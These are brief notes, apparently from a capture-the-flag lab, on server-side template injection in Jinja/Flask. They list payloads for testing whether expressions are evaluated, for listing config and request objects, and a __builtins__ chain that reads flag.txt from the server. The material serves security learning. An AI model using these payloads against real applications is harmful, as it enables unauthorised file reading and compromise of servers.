- Injection occurs when an application takes user input and mishandles it. Instead of processing the input securely, the application passes it directly into a system that can execute commands or queries, such as a database, a shell, a templating engine or API.
- commands to put
- Prove code execution. Submit {{ 7 * 7 }} to confirm expressions are evaluated.
- Enumerate context. Use {{ config.items() }} or {{ request.__dict__ }} to discover objects exposed to the template.
- Read the flag. Jinja exposes Flask globals, so run {{ request.application.__globals__.__builtins__.open('flag.txt').read() }} to cat the file on the server.

